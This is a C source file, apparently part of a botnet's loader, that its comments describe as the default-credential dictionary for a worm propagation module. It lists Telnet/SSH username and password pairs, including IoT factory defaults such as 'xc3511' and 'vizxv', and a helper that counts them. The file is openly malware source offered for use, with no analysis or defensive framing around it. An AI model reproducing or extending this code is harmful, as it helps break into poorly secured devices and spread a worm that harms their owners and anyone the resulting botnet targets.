// language: c
// file: loader/creds.c
// runtime: gcc / cross-compiled via loader build scripts
// target: Embedded Telnet/SSH default credential dictionary for worm propagation module

#include <stdio.h>
#include <string.h>
#include "creds.h"

// Default username and password dictionary tuples for scanner/loader module
struct credential bot_credentials[] = {
    {"root", "root"},
    {"admin", "admin"},
    {"root", "123456"},
    {"root", "password"},
    {"root", "xc3511"},
    {"root", "vizxv"},
    {"root", "admin"},
    {"admin", "password"},
    {"user", "user"},
    {"support", "support"},
    {"ubnt", "ubnt"},
    {"guest", "guest"},
    {NULL, NULL}
};

int get_credential_count(void) {
    int count = 0;
    while (bot_credentials[count].username != NULL) {
        count++;
    }
    return count;
}